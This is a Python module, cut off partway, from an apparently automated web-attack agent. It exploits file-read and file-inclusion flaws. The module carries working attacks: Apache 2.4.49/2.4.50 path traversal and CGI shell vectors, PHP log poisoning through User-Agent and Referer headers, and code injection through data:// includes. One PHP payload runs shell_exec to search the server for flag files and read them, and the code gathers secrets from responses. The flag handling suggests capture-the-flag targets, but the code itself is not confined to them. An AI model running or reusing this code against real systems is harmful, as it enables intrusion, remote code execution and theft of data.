from __future__ import annotations

import html
import json
import re
import secrets
from dataclasses import dataclass
from typing import Callable, TypeVar, cast
from urllib.parse import parse_qsl, urlsplit, urlunsplit

from ravage.agent_core.agent_state import AgentState
from ravage.probes.apache_traversal import (
    APACHE_CANONICAL_READ_PATH,
    ApacheTraversalVector,
    apache_cgi_read_body,
    apache_traversal_vectors,
)
from ravage.probes.file_read.listed_files import _probe_listed_file_param_readbacks
from ravage.probes.file_read.payloads import (
    _absolute_flag_paths,
    _candidate_file_payloads_for_primitive,
    _candidate_file_payloads_from_content,
    _decoded_text_fragments,
    _file_read_probe_payloads_for_target,
    _file_read_signal,
    _php_log_paths,
    _primitive_include_suffix,
    _quick_file_read_probe_payloads_for_target,
    _target_looks_static_resource_selector,
)
from ravage.probes.file_read.upload import (
    _probe_upload_readbacks,
    _targets_suggest_upload,
    _upload_evidence_present,
)
from ravage.web_core.http_probe import (
    ProbeResponse,
    ProbeSession,
    compare_responses,
    inject_query_param,
    response_secrets,
)
from ravage.web_core.proof_recognizer import recognize_proofs

_VERIFY_BUDGET = 60
_EXTRACT_BUDGET = 80
_LISTED_FILE_CLOSURE_RESERVE = 18
_APACHE_CLOSURE_BUDGET = 16
_SYNTHETIC_FILE_PARAM_NAMES = (
    "file",
    "page",
    "path",
    "template",
    "include",
    "view",
    "content",
    "doc",
    "document",
    "filename",
    "url",
    "uri",
    "redirect",
    "next",
    "lang",
)

_ResultT = TypeVar("_ResultT")


@dataclass
class _ProbeBatch:
    findings: list[dict[str, object]]
    requests: list[dict[str, object]]
    budget: int


def probe_file_read_extract(
    session: ProbeSession,
    state: AgentState,
    result_cls: Callable[..., _ResultT],
) -> _ResultT:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    primitives, budget = _file_read_extract_primitives(session, state, requests)

    for primitive in primitives[:4]:
        if budget <= 0:
            break

        batch = _probe_file_read_extract_primitive(
            session,
            state,
            primitive,
            budget=budget,
        )
        budget = batch.budget
        requests.extend(batch.requests)
        findings.extend(batch.findings)

        if _findings_include_proofs(batch.findings):
            break

    return result_cls(
        ok=bool(findings),
        probe="file_read_extract",
        summary=f"tested {len(primitives[:4])} file-read primitive(s), requests={_EXTRACT_BUDGET - budget}, findings={len(findings)}",
        findings=findings[:20],
        requests=requests[:100],
    )


def _file_read_extract_primitives(
    session: ProbeSession,
    state: AgentState,
    requests: list[dict[str, object]],
) -> tuple[list[dict[str, object]], int]:
    primitives = _file_read_primitives(state)
    if primitives:
        return primitives, _EXTRACT_BUDGET

    apache_batch = _probe_apache_traversal(
        session,
        state,
        budget=_VERIFY_BUDGET,
        close_primitive=False,
    )
    requests.extend(apache_batch.requests)
    apache_primitives = _primitives_from_findings(apache_batch.findings)
    if apache_primitives:
        verification_budget_used = _VERIFY_BUDGET - apache_batch.budget
        return apache_primitives, max(0, _EXTRACT_BUDGET - verification_budget_used)

    primitives, verify_requests, remaining_budget = _verify_file_read_targets(
        session,
        state,
        budget=apache_batch.budget,
    )
    requests.extend(verify_requests)

    verification_budget_used = _VERIFY_BUDGET - remaining_budget
    extract_budget = _EXTRACT_BUDGET - verification_budget_used
    return primitives, max(0, extract_budget)


def _probe_file_read_extract_primitive(
    session: ProbeSession,
    state: AgentState,
    primitive: dict[str, object],
    *,
    budget: int,
) -> _ProbeBatch:
    immediate_proof = _primitive_proof_finding(primitive)
    if immediate_proof is not None:
        return _ProbeBatch(findings=[immediate_proof], requests=[], budget=budget)

    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []

    if _php_surface(state, primitive):
        php_batch = _probe_php_include_paths(session, primitive, budget=budget)
        budget = php_batch.budget
        findings.extend(php_batch.findings)
        requests.extend(php_batch.requests)

        if _findings_include_proofs(php_batch.findings) or budget <= 0:
            return _ProbeBatch(findings=findings, requests=requests, budget=budget)

    extraction, extract_requests, budget = _extract_with_primitive(
        session,
        primitive,
        budget=budget,
    )
    requests.extend(extract_requests)
    if extraction:
        findings.append(extraction)

    return _ProbeBatch(findings=findings, requests=requests, budget=budget)


def _primitive_proof_finding(primitive: dict[str, object]) -> dict[str, object] | None:
    primitive_signal = _dict_value(primitive.get("signal"))
    primitive_proofs = _string_items(primitive_signal.get("proofs"))
    if not primitive_proofs:
        return None

    payload = str(primitive.get("payload") or "")
    return {
        "type": "file_read_extracted_proof",
        "primitive": primitive,
        "payload": payload,
        "proofs": primitive_proofs,
        "response": {},
        "replay": _primitive_replay(primitive, payload),
    }


def _probe_php_include_paths(
    session: ProbeSession,
    primitive: dict[str, object],
    *,
    budget: int,
) -> _ProbeBatch:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []

    execution, exec_requests, budget = _try_php_data_include_execution(
        session,
        primitive,
        budget=budget,
    )
    requests.extend(exec_requests)
    if execution:
        findings.append(execution)
        if _finding_has_proof(execution):
            return _ProbeBatch(findings=findings, requests=requests, budget=budget)

    if budget <= 0 or _primitive_include_suffix(primitive):
        return _ProbeBatch(findings=findings, requests=requests, budget=budget)

    execution, exec_requests, budget = _try_php_include_execution(
        session,
        primitive,
        budget=budget,
    )
    requests.extend(exec_requests)
    if execution:
        findings.append(execution)

    return _ProbeBatch(findings=findings, requests=requests, budget=budget)


def probe_file_fetch_parser(
    session: ProbeSession,
    state: AgentState,
    result_cls: Callable[..., _ResultT],
) -> _ResultT:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    budget = _VERIFY_BUDGET
    targets = _file_read_targets(state)
    upload_checked = False

    if _should_probe_upload_readbacks_first(state, targets, budget):
        upload_batch = _probe_upload_readbacks_with_cap(
            session,
            state,
            budget=budget,
            cap=28,
        )
        upload_checked = True
        budget = upload_batch.budget
        findings.extend(upload_batch.findings)
        requests.extend(upload_batch.requests)

        if _findings_include_proofs(findings):
            summary = (
                "tested upload forms before path parameters, "
                f"requests={_VERIFY_BUDGET - budget}, findings={len(findings)}"
            )
            return _file_fetch_parser_result(
                result_cls,
                findings=findings,
                requests=requests,
                budget=budget,
                targets=targets,
                summary=summary,
                ok=True,
            )

    apache_batch = _probe_apache_traversal(
        session,
        state,
        budget=budget,
        close_primitive=True,
    )
    budget = apache_batch.budget
    findings.extend(apache_batch.findings)
    requests.extend(apache_batch.requests)
    if apache_batch.findings:
        return _file_fetch_parser_result(
            result_cls,
            findings=findings,
            requests=requests,
            budget=budget,
            targets=targets,
            summary=(
                "verified Apache traversal with breadth-first candidates; "
                f"requests={_VERIFY_BUDGET - budget}, findings={len(findings)}"
            ),
            ok=True,
        )

    quick_batch = _probe_quick_file_read_targets(
        session,
        targets,
        budget=budget,
    )
    budget = quick_batch.budget
    findings.extend(quick_batch.findings)
    requests.extend(quick_batch.requests)

    if not _findings_include_proofs(findings) and budget > 0:
        php_closure = _probe_verified_php_lfi_closures(
            session,
            state,
            findings,
            budget=budget,
        )
        budget = php_closure.budget
        findings.extend(php_closure.findings)
        requests.extend(php_closure.requests)

    if not _findings_include_proofs(findings) and budget > 0:
        listed_batch = _probe_listed_file_readbacks_with_cap(
            session,
            state,
            budget=budget,
        )
        budget = listed_batch.budget
        findings.extend(listed_batch.findings)
        requests.extend(listed_batch.requests)

    if _should_probe_upload_readbacks_after_paths(upload_checked, findings, budget):
        upload_batch = _probe_upload_readbacks_with_cap(
            session,
            state,
            budget=budget,
            cap=24,
        )
        budget = upload_batch.budget
        findings.extend(upload_batch.findings)
        requests.extend(upload_batch.requests)

    if not findings and budget > 0:
        extended_batch = _probe_extended_file_read_targets(
            session,
            targets,
            budget=budget,
        )
        budget = extended_batch.budget
        findings.extend(extended_batch.findings)
        requests.extend(extended_batch.requests)

    return _file_fetch_parser_result(
        result_cls,
        findings=findings,
        requests=requests,
        budget=budget,
        targets=targets,
    )


def _should_probe_upload_readbacks_first(
    state: AgentState,
    targets: list[dict[str, object]],
    budget: int,
) -> bool:
    if budget <= 0:
        return False
    return _upload_evidence_present(state) or _targets_suggest_upload(targets)


def _should_probe_upload_readbacks_after_paths(
    upload_checked: bool,
    findings: list[dict[str, object]],
    budget: int,
) -> bool:
    if upload_checked or budget <= 0:
        return False
    return not findings


def _probe_upload_readbacks_with_cap(
    session: ProbeSession,
    state: AgentState,
    *,
    budget: int,
    cap: int,
) -> _ProbeBatch:
    upload_budget = min(budget, cap)
    upload_findings, upload_requests, upload_remaining = _probe_upload_readbacks(
        session,
        state,
        budget=upload_budget,
    )
    spent = upload_budget - upload_remaining
    return _ProbeBatch(
        findings=upload_findings,
        requests=upload_requests,
        budget=budget - spent,
    )


def _probe_quick_file_read_targets(
    session: ProbeSession,
    targets: list[dict[str, object]],
    *,
    budget: int,
) -> _ProbeBatch:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []

    for target in targets[:20]:
        if budget <= _LISTED_FILE_CLOSURE_RESERVE:
            break

        target_budget = budget - _LISTED_FILE_CLOSURE_RESERVE
        payloads = _quick_file_read_probe_payloads_for_target(session, target)
        finding, remaining = _probe_file_read_target(
            session,
            target,
            payloads,
            requests=requests,
            budget=target_budget,
        )
        budget = remaining + _LISTED_FILE_CLOSURE_RESERVE

        if finding:
            findings.append(finding)
            if _finding_signal_kind(finding) == "proof_read":
                break

    return _ProbeBatch(findings=findings, requests=requests, budget=budget)


def _probe_listed_file_readbacks_with_cap(
    session: ProbeSession,
    state: AgentState,
    *,
    budget: int,
) -> _ProbeBatch:
    listed_budget = min(budget, _LISTED_FILE_CLOSURE_RESERVE)
    listed_findings, listed_requests, listed_remaining = _probe_listed_file_param_readbacks(
        session,
        state,
        budget=listed_budget,
    )
    spent = listed_budget - listed_remaining
    return _ProbeBatch(
        findings=listed_findings,
        requests=listed_requests,
        budget=budget - spent,
    )


def _probe_extended_file_read_targets(
    session: ProbeSession,
    targets: list[dict[str, object]],
    *,
    budget: int,
) -> _ProbeBatch:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []

    for target in targets[:8]:
        if budget <= 0:
            break

        payloads = _remaining_file_read_payloads(session, target)
        finding, budget = _probe_file_read_target(
            session,
            target,
            payloads,
            requests=requests,
            budget=budget,
        )

        if finding:
            findings.append(finding)
            if _finding_signal_kind(finding) == "proof_read":
                break

    return _ProbeBatch(findings=findings, requests=requests, budget=budget)


def _probe_verified_php_lfi_closures(
    session: ProbeSession,
    state: AgentState,
    verified_findings: list[dict[str, object]],
    *,
    budget: int,
) -> _ProbeBatch:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []

    for verified in verified_findings[:3]:
        if budget <= 0:
            break
        primitive = _dict_value(verified.get("primitive"))
        if not primitive or not _php_surface(state, primitive):
            continue
        batch = _probe_file_read_extract_primitive(
            session,
            state,
            primitive,
            budget=budget,
        )
        budget = batch.budget
        findings.extend(batch.findings)
        requests.extend(batch.requests)
        if _findings_include_proofs(batch.findings):
            break

    return _ProbeBatch(findings=findings, requests=requests, budget=budget)


def _remaining_file_read_payloads(
    session: ProbeSession,
    target: dict[str, object],
) -> list[str]:
    quick_payloads = set(_quick_file_read_probe_payloads_for_target(session, target))
    payloads: list[str] = []

    for payload in _file_read_probe_payloads_for_target(session, target):
        if payload in quick_payloads:
            continue
        payloads.append(payload)
        if len(payloads) >= 12:
            break

    return payloads


def _file_fetch_parser_result(
    result_cls: Callable[..., _ResultT],
    *,
    findings: list[dict[str, object]],
    requests: list[dict[str, object]],
    budget: int,
    targets: list[dict[str, object]],
    summary: str | None = None,
    ok: bool | None = None,
) -> _ResultT:
    if summary is None:
        target_count = len(targets[:14])
        request_count = _VERIFY_BUDGET - budget
        summary = (
            f"tested {target_count} file/path/parser target(s) plus upload forms, "
            f"requests={request_count}, findings={len(findings)}"
        )

    if ok is None:
        ok = bool(findings)

    return result_cls(
        ok=ok,
        probe="file_fetch_parser",
        summary=summary,
        findings=findings[:30],
        requests=requests[:90],
    )


def _probe_apache_traversal(
    session: ProbeSession,
    state: AgentState,
    *,
    budget: int,
    close_primitive: bool,
) -> _ProbeBatch:
    if budget <= 0 or not _apache_traversal_surface(state):
        return _ProbeBatch(findings=[], requests=[], budget=budget)

    origin = str(state.surface.get("origin") or state.surface.get("target_url") or "").rstrip("/")
    if not origin:
        return _ProbeBatch(findings=[], requests=[], budget=budget)

    baseline = session.get(str(state.surface.get("target_url") or origin + "/"))
    budget -= 1
    requests: list[dict[str, object]] = [
        baseline.summary(body_chars=120)
        | {
            "probe_kind": "apache_traversal_baseline",
            "candidate_strategy": "breadth_before_depth",
        }
    ]
    banner = _apache_server_banner(state, baseline)
    # Keep the verified file-read route self-contained: agent routing can select
    # this specialist directly from Apache evidence, so its bounded CGI read
    # fallback must remain available even though command probing owns RCE
    # confirmation.  Each family still tries a direct read before its CGI form.
    for vector in apache_traversal_vectors(banner):
        if budget <= 0:
            break
        target = _apache_vector_target(origin, vector)
        response = _send_target(session, target, APACHE_CANONICAL_READ_PATH)
        budget -= 1
        delta = compare_responses(baseline, response, marker=APACHE_CANONICAL_READ_PATH)
        requests.append(
            response.summary(body_chars=240)
            | {
                "target": _target_brief(target),
                "probe_kind": "file_read_verify" if close_primitive else "extract_verify",
                "payload": APACHE_CANONICAL_READ_PATH,
                "delta": delta.to_json(),
                "candidate_strategy": "breadth_before_depth",
            }
        )
        signal = _file_read_signal(response, baseline=baseline)
        if not signal:
            continue

        primitive = _primitive_from_target(target, APACHE_CANONICAL_READ_PATH, signal)
        finding = _apache_file_read_finding(
            target=target,
            primitive=primitive,
            signal=signal,
            response=response,
            baseline=baseline,
            delta=delta.to_json(),
        )
        findings = [finding]
        if close_primitive and budget > 0 and not _finding_has_proof(finding):
            closure_budget = min(budget, _APACHE_CLOSURE_BUDGET)
            extraction, closure_requests, closure_remaining = _extract_with_primitive(
                session,
                primitive,
                budget=closure_budget,
            )
            budget -= closure_budget - closure_remaining
            requests.extend(closure_requests)
            if extraction is not None:
                findings.append(extraction)
        return _ProbeBatch(findings=findings, requests=requests, budget=budget)

    return _ProbeBatch(findings=[], requests=requests, budget=budget)


def _apache_vector_target(origin: str, vector: ApacheTraversalVector) -> dict[str, object]:
    if vector.mode == "cgi":
        return {
            "kind": "apache_cgi_shell",
            "input": "path",
            "url": origin + vector.path_template,
            "hints": ["apache_2_4_cgi_traversal"],
            "priority": 720,
            "apache_family": vector.family,
            "apache_depth": vector.depth,
            "apache_alias": vector.alias,
        }
    return {
        "kind": "direct_path",
        "input": "path",
        "url": origin + vector.path_template,
        "path_template": origin + vector.path_template,
        "hints": ["apache_2_4_path_traversal"],
        "priority": 720,
        "apache_family": vector.family,
        "apache_depth": vector.depth,
        "apache_alias": vector.alias,
    }


def _apache_file_read_finding(  # noqa: PLR0913 - typed evidence record fields.
    *,
    target: dict[str, object],
    primitive: dict[str, object],
    signal: dict[str, object],
    response: ProbeResponse,
    baseline: ProbeResponse,
    delta: dict[str, object],
) -> dict[str, object]:
    finding: dict[str, object] = {
        "type": _file_read_finding_type(signal),
        "input": _target_brief(target),
        "payload": APACHE_CANONICAL_READ_PATH,
        "signal": signal,
        "delta": delta,
        "control_response": baseline.summary(body_chars=220),
        "response": response.summary(body_chars=520),
        "replay": _target_replay(target, APACHE_CANONICAL_READ_PATH),
        "next": "Apache traversal primitive verified; bounded proof-file closure was attempted.",
        "primitive": primitive,
    }
    proofs = _string_items(signal.get("proofs"))
    if proofs:
        finding["proofs"] = proofs
    matches = _string_items(signal.get("matches"))
    if matches:
        finding["matches"] = matches
    return finding


def _apache_server_banner(state: AgentState, baseline: ProbeResponse) -> str:
    response_banner = str(baseline.headers.get("server") or baseline.headers.get("Server") or "")
    return response_banner + " " + json.dumps(state.surface, sort_keys=True)


def _primitives_from_findings(findings: list[dict[str, object]]) -> list[dict[str, object]]:
    primitives: list[dict[str, object]] = []
    for finding in findings:
        primitive = finding.get("primitive")
        if isinstance(primitive, dict):
            primitives.append(primitive)
    return primitives


def _probe_file_read_target(
    session: ProbeSession,
    target: dict[str, object],
    payloads: list[str],
    *,
    requests: list[dict[str, object]],
    budget: int,
) -> tuple[dict[str, object] | None, int]:
    if budget <= 0:
        return None, budget

    baseline, baseline_requests, budget = _file_read_target_baseline(
        session,
        target,
        budget=budget,
    )
    requests.extend(baseline_requests)

    for payload in _dedupe(payloads):
        if budget <= 0:
            break

        finding, payload_requests, budget = _probe_file_read_payload(
            session,
            target,
            payload,
            baseline=baseline,
            budget=budget,
        )
        requests.extend(payload_requests)
        if finding:
            return finding, budget

    return None, budget


def _file_read_target_baseline(
    session: ProbeSession,
    target: dict[str, object],
    *,
    budget: int,
) -> tuple[ProbeResponse, list[dict[str, object]], int]:
    baseline = _send_target(session, target, _baseline_value(target))
    budget -= 1
    baseline, readbacks, budget = _follow_file_read_redirect(
        session,
        baseline,
        budget=budget,
    )

    requests: list[dict[str, object]] = []
    requests.append(
        baseline.summary(body_chars=120)
        | {
            "target": _target_brief(target),
            "probe_kind": "baseline",
        }
    )
    requests.extend(readbacks)
    return baseline, requests, budget


def _probe_file_read_payload(
    session: ProbeSession,
    target: dict[str, object],
    payload: str,
    *,
    baseline: ProbeResponse,
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    response = _send_target(session, target, payload)
    budget -= 1
    response, readbacks, budget = _follow_file_read_redirect(
        session,
        response,
        budget=budget,
    )

    delta = compare_responses(baseline, response, marker=payload)
    requests: list[dict[str, object]] = []
    requests.append(
        response.summary(body_chars=220)
        | {
            "target": _target_brief(target),
            "probe_kind": "file_read_verify",
            "payload": payload,
            "delta": delta.to_json(),
        }
    )
    requests.extend(readbacks)

    signal = _file_read_signal(response, baseline=baseline)
    if not signal:
        return None, requests, budget

    primitive = _primitive_from_target(target, payload, signal)
    finding = {
        "type": _file_read_finding_type(signal),
        "input": _target_brief(target),
        "payload": payload,
        "signal": signal,
        "delta": delta.to_json(),
        "response": response.summary(body_chars=420),
        "replay": _target_replay(target, payload),
        "next": "Run run_probe file_read_extract to reuse this exact request template for bounded extraction.",
        "primitive": primitive,
    }
    proofs = _string_items(signal.get("proofs"))
    if proofs:
        finding["proofs"] = proofs
    matches = _string_items(signal.get("matches"))
    if matches:
        finding["matches"] = matches
    return finding, requests, budget


def _file_read_finding_type(signal: dict[str, object]) -> str:
    if signal.get("kind") == "local_file_read":
        return "file_read_primitive"
    return "file_fetch_parser_signal"


def _finding_has_proof(finding: dict[str, object]) -> bool:
    return bool(finding.get("proofs"))


def _findings_include_proofs(findings: list[dict[str, object]]) -> bool:
    for finding in findings:
        if _finding_has_proof(finding):
            return True
    return False


def _finding_signal_kind(finding: dict[str, object]) -> str:
    signal = finding.get("signal")
    if not isinstance(signal, dict):
        return ""
    return str(signal.get("kind") or "")


def _verify_file_read_targets(
    session: ProbeSession,
    state: AgentState,
    *,
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    primitives: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    for target in _file_read_targets(state)[:14]:
        if budget <= 0:
            break
        baseline = _send_target(session, target, _baseline_value(target))
        budget -= 1
        baseline, baseline_readbacks, budget = _follow_file_read_redirect(session, baseline, budget=budget)
        requests.append(baseline.summary(body_chars=100) | {"target": _target_brief(target), "probe_kind": "extract_baseline"})
        requests.extend(baseline_readbacks)
        for payload in _file_read_probe_payloads_for_target(session, target):
            if budget <= 0:
                break
            response = _send_target(session, target, payload)
            budget -= 1
            response, readbacks, budget = _follow_file_read_redirect(session, response, budget=budget)
            requests.append(response.summary(body_chars=180) | {"target": _target_brief(target), "probe_kind": "extract_verify", "payload": payload})
            requests.extend(readbacks)
            signal = _file_read_signal(response, baseline=baseline)
            if signal:
                primitives.append(_primitive_from_target(target, payload, signal))
                if signal["kind"] in {"proof_read", "secret_read"}:
                    return primitives, requests, budget
                break
    return primitives, requests, budget


def _extract_with_primitive(
    session: ProbeSession,
    primitive: dict[str, object],
    *,
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    best: dict[str, object] | None = None
    payloads = _candidate_file_payloads_for_primitive(primitive)
    seen_payloads = set(payloads)
    index = 0
    while index < len(payloads):
        payload = payloads[index]
        index += 1
        if budget <= 0:
            break
        response = _send_primitive(session, primitive, payload)
        budget -= 1
        response, readbacks, budget = _follow_file_read_redirect(session, response, budget=budget)
        include_failure = _php_include_failure_response(response.body, payload=payload)
        request_summary = response.summary(body_chars=320) | {"probe_kind": "file_read_extract", "payload": payload}
        if include_failure:
            request_summary["include_failure"] = include_failure
        requests.append(request_summary)
        requests.extend(readbacks)
        proofs = recognize_proofs(response.body)
        secrets = response_secrets(response)
        if proofs:
            return (
                {
                    "type": "file_read_extracted_proof",
                    "primitive": primitive,
                    "payload": payload,
                    "proofs": proofs,
                    "response": response.summary(body_chars=700),
                    "replay": _primitive_replay(primitive, payload),
                },
                requests,
                budget,
            )
        rendered_bodies = [response.body, *_decoded_text_fragments(response.body)]
        source_seen = any(_source_like(rendered) for rendered in rendered_bodies)
        if include_failure:
            continue
        if secrets or source_seen:
            best = {
                "type": "file_read_extracted_content",
                "primitive": primitive,
                "payload": payload,
                "matches": secrets[:12],
                "response": response.summary(body_chars=520),
                "replay": _primitive_replay(primitive, payload),
            }
            for rendered in rendered_bodies:
                for discovered in _candidate_file_payloads_from_content(rendered, payload):
                    if discovered in seen_payloads:
                        continue
                    seen_payloads.add(discovered)
                    payloads.append(discovered)
                    if len(payloads) >= 120:
                        break
                if len(payloads) >= 120:
                    break
    return best, requests, budget


def _try_php_include_execution(
    session: ProbeSession,
    primitive: dict[str, object],
    *,
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    token = "RAVAGE_PHP_INCLUDE_" + secrets.token_hex(4)
    payload = _php_include_payload(token)
    for seed_url, headers in _php_log_seed_requests(session, primitive, payload, token):
        if budget <= 0:
            break
        poison = session.get(seed_url, headers=headers)
        budget -= 1
        requests.append(
            poison.summary(body_chars=120)
            | {
                "probe_kind": "php_log_poison_seed",
                "seed_url": seed_url,
                "seed_headers": sorted(headers),
            }
        )
    for log_path in _php_log_paths(str(primitive.get("payload") or "")):
        if budget <= 0:
            break
        response = _send_primitive(session, primitive, log_path)
        budget -= 1
        requests.append(response.summary(body_chars=520) | {"probe_kind": "php_log_poison_include", "payload": log_path})
        proofs = recognize_proofs(response.body)
        if proofs:
            return (
                {
                    "type": "php_include_extracted_proof",
                    "primitive": primitive,
                    "payload": log_path,
                    "verification_token": token if token in response.body else "",
                    "proofs": proofs,
                    "response": response.summary(body_chars=900),
                    "replay": _primitive_replay(primitive, log_path),
                    "next": "Capture the exact proof string from proofs.",
                },
                requests,
                budget,
            )
        if token not in response.body:
            continue
        return (
            {
                "type": "php_include_execution",
                "primitive": primitive,
                "payload": log_path,
                "verification_token": token,
                "proofs": [],
                "response": response.summary(body_chars=900),
                "replay": _primitive_replay(primitive, log_path),
                "next": "If proofs is non-empty, capture that exact proof string. Otherwise use the verified PHP include execution to run a narrower bounded extractor.",
            },
            requests,
            budget,
        )
    return None, requests, budget


def _try_php_data_include_execution(
    session: ProbeSession,
    primitive: dict[str, object],
    *,
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    if budget <= 0:
        return None, [], budget
    token = "RAVAGE_PHP_INCLUDE_" + secrets.token_hex(4)
    payload = "data://text/plain," + _php_include_payload(token, terminate=True)
    response = _send_primitive(session, primitive, payload)
    budget -= 1
    request = response.summary(body_chars=700) | {"probe_kind": "php_data_include", "payload": payload}
    include_failure = _php_include_failure_response(response.body, payload=payload)
    if include_failure:
        request["include_failure"] = include_failure
        return None, [request], budget
    proofs = recognize_proofs(response.body)
    if proofs:
        return (
            {
                "type": "php_include_extracted_proof",
                "primitive": primitive,
                "payload": payload,
                "verification_token": token if token in response.body else "",
                "proofs": proofs,
                "response": response.summary(body_chars=1000),
                "replay": _primitive_replay(primitive, payload),
                "next": "Capture the exact proof string from proofs.",
            },
            [request],
            budget,
        )
    if token in response.body:
        return (
            {
                "type": "php_include_execution",
                "primitive": primitive,
                "payload": payload,
                "verification_token": token,
                "proofs": [],
                "response": response.summary(body_chars=1000),
                "replay": _primitive_replay(primitive, payload),
                "next": "PHP include execution is verified; reuse this primitive with narrower proof-path payloads.",
            },
            [request],
            budget,
        )
    return None, [request], budget


def _php_include_payload(token: str, *, terminate: bool = False) -> str:
    static_flag_paths = ",".join(_php_single_quoted(path) for path in _absolute_flag_paths())
    tail = " exit;" if terminate else ""
    return (
        "<?php echo " + _php_single_quoted(token) + ".chr(10); "
        "$paths=array(" + static_flag_paths + "); "
        "foreach($paths as $p){if(is_readable($p)){echo chr(10).$p.chr(10).@file_get_contents($p);}} "
        "$out=@shell_exec('find / -maxdepth 4 -type f -iname \\*flag\\* 2>/dev/null'); "
        "if($out){echo chr(10).$out; foreach(explode(chr(10), trim($out)) as $p){"
        "if(is_readable($p)){echo chr(10).$p.chr(10).@file_get_contents($p);}}}" + tail + " ?>"
    )


def _php_include_failure_response(body: str, *, payload: str = "") -> str:
    lowered = html.unescape(body).lower()
    payload_lower = payload.lower()
    if "wrapper is disabled" in lowered and "allow_url_include" in lowered:
        return "php_url_wrapper_disabled"
    if "no suitable wrapper could be found" in lowered and "failed opening required" in lowered:
        return "php_url_wrapper_unavailable"
    if "failed opening required" in lowered and ("require_once" in lowered or "include" in lowered):
        if payload_lower and payload_lower in lowered:
            return "php_include_path_failed"
        if "include_path=" in lowered:
            return "php_include_path_failed"
    if "call to undefined function" in lowered and re.search(r"\brequire(?:_once)?\(\)", lowered):
        return "php_include_bootstrap_failed"
    return ""


def _php_single_quoted(value: str) -> str:
    return "'" + value.replace("\\", "\\\\").replace("'", "\\'") + "'"


def _php_log_seed_requests(
    session: ProbeSession,
    primitive: dict[str, object],
    payload: str,
    token: str,
) -> list[tuple[str, dict[str, str]]]:
    target = _dict_value(primitive.get("target"))
    candidate_urls = [
        session.target_url,
        str(target.get("url") or ""),
        session.absolute("/__ravage_lfi_log_seed_" + token.lower()),
    ]
    headers = [
        {"User-Agent": payload, "Referer": payload},
        {"User-Agent": payload, "X-Forwarded-For": "127.0.0.1"},
        {"User-Agent": "ravage-lfi-probe", "Referer": payload},
    ]
    requests: list[tuple[str, dict[str, str]]] = []
    for url in _dedupe(candidate_urls):
        if not url:
            continue
        for header_set in headers:
            requests.append((url, header_set))
    return requests[:6]


def _file_read_primitives(state: AgentState) -> list[dict[str, object]]:
    primitives: list[dict[str, object]] = []
    for value in state.signals.get("file_read_inputs", []):
        try:
            payload = json.loads(value)
        except json.JSONDecodeError:
            continue
        if isinstance(payload, dict):
            primitives.append(cast(dict[str, object], payload))
    return primitives[:8]


def _file_read_targets(state: AgentState) -> list[dict[str, object]]:
    targets: list[dict[str, object]] = []
    for target in _parameter_targets(state, limit=30):
        if _target_looks_file_read_candidate(target):
            targets.append(target)
    for form in _form_targets(state, limit=10):
        action = str(form.get("action") or state.surface.get("target_url") or "")
        if not action:
            continue
        for name in _form_input_names(form):
            target = {
                "kind": "form",
                "url": action,
                "input": name,
                "form": form,
                "hints": _string_items(form.get("categories")),
                "priority": 35,
            }
            if _target_looks_file_read_candidate(target):
                targets.append(target)
    targets.extend(_synthetic_file_param_targets(state))
    if not targets:
        for target in _parameter_targets(state, limit=12):
            copied = dict(target)
            copied["fallback"] = True
            targets.append(copied)
    deduped: dict[tuple[str, str, str, str], dict[str, object]] = {}
    for target in targets:
        key = (
            str(target.get("kind")),
            _target_dedupe_url(target),
            str(_target_input_name(target)),
            str(target.get("path_template") or ""),
        )
        previous = deduped.get(key)
        if previous is None or _int_value(target.get("priority")) > _int_value(previous.get("priority")):
            deduped[key] = target
    ordered = list(deduped.values())
    ordered.sort(key=lambda item: (-_file_target_priority(item), str(item.get("url")), str(_target_input_name(item))))
    return ordered


def _apache_traversal_surface(state: AgentState) -> bool:
    text = json.dumps(state.surface, sort_keys=True).lower()
    return "apache/2.4.49" in text or "apache/2.4.50" in text


def _synthetic_file_param_targets(state: AgentState) -> list[dict[str, object]]:
    endpoints = _dedupe(_file_param_candidate_endpoint_urls(state))
    targets: list[dict[str, object]] = []
    for url in endpoints[:10]:
        if not _endpoint_accepts_synthetic_file_params(url):
            continue
        for name in _SYNTHETIC_FILE_PARAM_NAMES:
            targets.append(
                {
                    "kind": "query_param",
                    "name": name,
                    "input": name,
                    "url": url,
                    "sources": ["synthetic_file_param"],
                    "hints": ["file_param_candidate"],
                    "priority": 28,
                    "synthetic": True,
                }
            )
    return targets


def _file_param_candidate_endpoint_urls(state: AgentState) -> list[str]:
    urls: list[str] = []
    for endpoint in _list_of_dicts(state.surface.get("endpoints")):
        url = str(endpoint.get("url") or "")
        if url:
            urls.append(url)
    for page in _list_of_dicts(state.surface.get("pages")):
        for key in ("final_url", "url"):
            url = str(page.get(key) or "")
            if url:
                urls.append(url)
    for value in state.signals.get("endpoints", []):
        if value:
            urls.append(str(value))
    return urls


def _endpoint_accepts_synthetic_file_params(url: str) -> bool:
    try:
        parts = urlsplit(url)
    except ValueError:
        return False
    path = parts.path.lower()
    if not path or path.endswith("/"):
        return False
    if parts.query:
        return False
    if any(word in path for word in ("/logout", "/delete", "/destroy", "/remove")):
        return False
    if path.endswith((".php", ".asp", ".aspx", ".jsp", ".jspx", ".do", ".action", ".cgi", ".pl", ".py")):
        return True
    return False


def _parameter_targets(state: AgentState, *, limit: int) -> list[dict[str, object]]:
    targets: list[dict[str, object]] = []
    seen: set[tuple[str, str]] = set()
    for param in _list_of_dicts(state.surface.get("parameters")):
        name = str(param.get("name") or "")
        if not name:
            continue
        locations = _string_items(param.get("locations"))
        if not locations:
            locations = [str(state.surface.get("target_url") or "")]
        for location in locations[:6]:
            targets.append(
                {
                    "kind": "query_param",
                    "name": name,
                    "input": name,
                    "url": location,
